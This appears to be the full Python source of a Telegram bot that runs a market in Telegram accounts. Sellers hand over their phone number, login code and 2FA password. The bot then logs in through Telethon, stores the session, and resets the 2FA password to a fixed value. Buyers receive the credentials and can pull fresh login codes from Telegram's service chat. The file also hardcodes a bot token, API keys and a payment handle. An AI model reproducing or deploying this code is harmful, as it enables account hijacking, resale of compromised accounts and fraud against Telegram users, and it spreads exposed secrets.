import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tel_types
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError
import asyncio
import os
import threading
import re
import time
import json
import logging
from flask import Flask

# --- LOGGING & ERROR TRACKING ---
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# --- WEB SERVER FOR REPLIT/HEROKU (24/7) ---
app = Flask('')
@app.route('/')
def home(): return "<h1>SYSTEM STATUS: ALPHA-MASTER-ONLINE</h1>"
def run_web(): app.run(host='0.0.0.0', port=8080)
threading.Thread(target=run_web, daemon=True).start()

# --- CONFIGURATION ---
TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw'
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'
OWNER_ID = 7634311488

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- FILE BASED DATABASE (CRASH PROOF) ---
DB_FILE = 'database.json'
if not os.path.exists(DB_FILE):
    with open(DB_FILE, 'w') as f:
        json.dump({
            'users': {}, 'admins': [OWNER_ID], 'upi': 'abhay-op.315@ptyes',
            'stock': {}, 'sell_rates': {}, 'buy_rates': {}, 'stats': {'sales': 0, 'buys': 0}
        }, f)

def load_db():
    with open(DB_FILE, 'r') as f: return json.load(f)

def save_db(data):
    with open(DB_FILE, 'w') as f: json.dump(data, f, indent=4)

db = load_db()
active_logins = {}
if not os.path.exists('sessions'): os.makedirs('sessions')

# --- HELPERS ---
def is_admin(uid): return uid in db['admins'] or uid == OWNER_ID

# --- KEYBOARDS (STABLE CALLBACKS) ---
def get_main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('💰 BALANCE', '📥 DEPOSIT', '📤 SELL ID', '🛒 BUY ID', '📞 SUPPORT', '📊 MY STATS')
    return markup

# --- COMMANDS ---
@bot.message_handler(commands=['start'])
def start_handler(m):
    uid = str(m.from_user.id)
    if uid not in db['users']:
        db['users'][uid] = {'balance': 0, 'sold': 0, 'bought': 0, 'date': time.ctime()}
        save_db(db)
    bot.send_message(m.chat.id, "⚡ **PRIME MASTER BOT v12.0**\n\nFull Features Enabled:\n- Auto 2FA Change (2710)\n- Strict Deposit (SS+UTR)\n- Buy/Sell Engine\n- Multi-Admin Control", reply_markup=get_main_menu())

# --- DEPOSIT LOGIC (NO BUGS) ---
@bot.message_handler(func=lambda m: m.text == '📥 DEPOSIT')
def deposit_init(m):
    msg = bot.send_message(m.chat.id, "💵 **Amount enter karein (₹):**")
    bot.register_next_step_handler(msg, step_utr)

def step_utr(m):
    if not m.text.isdigit(): return bot.send_message(m.chat.id, "❌ Invalid. Numbers only.")
    amt = m.text
    msg = bot.send_message(m.chat.id, f"💳 **Payable UPI:** `{db['upi']}`\n\nAb **12-digit UTR** bhejein:")
    bot.register_next_step_handler(msg, step_ss, amt)

def step_ss(m, amt):
    utr = m.text.strip()
    if len(utr) != 12: return bot.send_message(m.chat.id, "❌ UTR must be 12 digits.")
    msg = bot.send_message(m.chat.id, "📸 Ab payment ka **Screenshot** bhejein:")
    bot.register_next_step_handler(msg, submit_deposit, amt, utr)

def submit_deposit(m, amt, utr):
    if m.content_type != 'photo': return bot.send_message(m.chat.id, "❌ Error: Screenshot required.")
    uid = m.from_user.id
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"adm_d_a_{uid}_{amt}"),
               types.InlineKeyboardButton("❌ REJECT", callback_data=f"adm_d_r_{uid}"))
    
    for adm in db['admins']:
        bot.send_photo(adm, m.photo[-1].file_id, caption=f"💰 **DEPOSIT**\nUser: `{uid}`\nAmt: ₹{amt}\nUTR: {utr}", reply_markup=markup)
    bot.send_message(m.chat.id, "⏳ Admin review pending...")

# --- LOGIN ENGINE (AUTO 2FA & STOCK) ---
def run_login(chat_id, phone, country, mode):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    
    async def task():
        await client.connect()
        try:
            req = await client.send_code_request(phone)
            active_logins[chat_id] = {'client': client, 'phone': phone, 'hash': req.phone_code_hash, 'loop': loop, 'country': country, 'mode': mode}
            msg = bot.send_message(chat_id, "📩 **OTP Sent!** Code bhejein:")
            bot.register_next_step_handler(msg, otp_check)
        except Exception as e: bot.send_message(chat_id, f"❌ Error: {e}")

    loop.run_until_complete(task())

def otp_check(m):
    d = active_logins.get(m.chat.id)
    async def verify():
        try:
            await d['client'].sign_in(d['phone'], m.text.strip(), phone_code_hash=d['hash'])
            await finish_login(m, d)
        except SessionPasswordNeededError:
            msg = bot.send_message(m.chat.id, "🔐 **2FA Password:**")
            bot.register_next_step_handler(msg, pass_check)
        except: bot.send_message(m.chat.id, "❌ Invalid OTP.")
    d['loop'].run_until_complete(verify())

def pass_check(m):
    d = active_logins.get(m.chat.id)
    async def verify():
        try:
            await d['client'].sign_in(password=m.text.strip())
            await finish_login(m, d, m.text.strip())
        except: bot.send_message(m.chat.id, "❌ Wrong 2FA.")
    d['loop'].run_until_complete(verify())

async def finish_login(m, d, pwd="None"):
    uid = str(m.chat.id)
    if d['mode'] == "sell":
        # Feature: Auto 2FA Change (2710)
        try:
            await d['client'](functions.account.UpdatePasswordSettingsRequest(
                new_settings=tel_types.account.PasswordInputSettings(new_password="2710", hint="2710")
            ))
        except: pass
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"adm_s_a_{uid}_{d['country']}"),
                   types.InlineKeyboardButton("❌ REJECT", callback_data=f"adm_s_r_{uid}"))
        for a in db['admins']:
            bot.send_message(a, f"📦 **SELL**\nUser: `{uid}`\nNum: `{d['phone']}`\nPass: `2710`", reply_markup=markup)
        bot.send_message(int(uid), "✅ ID connected! Admin checking...")
    else:
        db['stock'].setdefault(d['country'], []).append(f"{d['phone']}:PASS:{pwd}")
        save_db(db)
        bot.send_message(int(uid), "✅ Stock Added.")

# --- CALLBACKS (GLOBAL HANDLER) ---
@bot.callback_query_handler(func=lambda call: True)
def global_callback(call):
    p = call.data.split('_')
    uid = str(call.from_user.id)
    
    if p[0] == 'adm': # Admin Actions
        if p[1] == 'd': # Deposit
            target = p[3]
            if p[2] == 'a':
                db['users'][target]['balance'] += int(p[4])
                save_db(db)
                bot.send_message(int(target), f"✅ ₹{p[4]} added!")
                bot.edit_message_caption("Approved ✅", call.message.chat.id, call.message.message_id)
            else:
                bot.send_message(int(target), "❌ Deposit Rejected.")
                bot.edit_message_caption("Rejected ❌", call.message.chat.id, call.message.message_id)
        
        elif p[1] == 's': # Sell
            target, country = p[3], p[4]
            if p[2] == 'a':
                rate = db['sell_rates'].get(country, 0)
                db['users'][target]['balance'] += rate
                save_db(db)
                bot.send_message(int(target), f"✅ Sale for {country} Approved! ₹{rate} added.")
                bot.edit_message_text("Approved ✅", call.message.chat.id, call.message.message_id)

    elif p[0] == 'buyid':
        c = p[1]
        price = db['buy_rates'].get(c, 0)
        if db['users'][uid]['balance'] < price or not db['stock'].get(c):
            return bot.answer_callback_query(call.id, "No Bal/Stock", show_alert=True)
        
        data = db['stock'][c].pop(0)
        db['users'][uid]['balance'] -= price
        save_db(db)
        phone = data.split(':')[0]
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📩 GET CODE", callback_data=f"tool_otp_{phone}"),
                   types.InlineKeyboardButton("🚪 LOGOUT", callback_data=f"tool_out_{phone}"))
        bot.send_message(int(uid), f"🛒 **SUCCESS**\nData: `{data}`\nPass: 2710 (if changed)", reply_markup=markup)

    elif p[0] == 'tool':
        threading.Thread(target=otp_logout_tool, args=(call, p[1], p[2])).start()

def otp_logout_tool(call, action, phone):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    try:
        loop.run_until_complete(client.connect())
        if action == 'otp':
            m = loop.run_until_complete(client.get_messages(777000, limit=1))
            code = re.search(r'\b(\d{5})\b', m[0].message) if m else None
            bot.send_message(call.from_user.id, f"📩 **OTP:** `{code.group(1) if code else 'Try again'}`")
        else:
            loop.run_until_complete(client.log_out())
            bot.send_message(call.from_user.id, "✅ Session Logged Out.")
    except Exception as e: bot.send_message(call.from_user.id, f"❌ Tool Error: {e}")
    finally: loop.run_until_complete(client.disconnect())

# --- USER BUTTON HANDLERS ---
@bot.message_handler(func=lambda m: m.text == '💰 BALANCE')
def h_bal(m): bot.send_message(m.chat.id, f"💳 **Balance:** ₹{db['users'].get(str(m.from_user.id), {}).get('balance', 0)}")

@bot.message_handler(func=lambda m: m.text == '🛒 BUY ID')
def h_buy(m):
    markup = types.InlineKeyboardMarkup()
    for c, p in db['buy_rates'].items():
        markup.add(types.InlineKeyboardButton(f"{c} | ₹{p} | Stk: {len(db['stock'].get(c,[]))}", callback_data=f"buyid_{c}"))
    bot.send_message(m.chat.id, "🛒 **MARKET:**", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == '📤 SELL ID')
def h_sell(m):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for c in db['sell_rates']: markup.add(f"SELL {c}")
    bot.send_message(m.chat.id, "Select Country:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text.startswith('SELL '))
def h_sell_start(m):
    c = m.text.split()[1]
    msg = bot.send_message(m.chat.id, "📞 Num (+ format):", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, lambda ms: threading.Thread(target=run_login, args=(m.chat.id, ms.text, c, "sell")).start())

@bot.message_handler(commands=['addcountry'])
def add_c(m):
    if not is_admin(m.from_user.id): return
    try:
        _, n, b, s = m.text.split()
        db['buy_rates'][n.upper()], db['sell_rates'][n.upper()] = int(b), int(s)
        db['stock'].setdefault(n.upper(), [])
        save_db(db)
        bot.reply_to(m, "✅ Country Added.")
    except: bot.reply_to(m, "Format: `/addcountry INDIA 40 25` ")

@bot.message_handler(func=lambda m: m.text == '📞 SUPPORT')
def h_sup(m):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("👤 OWNER", url="https://t.me/god_abhay"))
    bot.send_message(m.chat.id, "Need help? Message us:", reply_markup=markup)

bot.polling(none_stop=True)
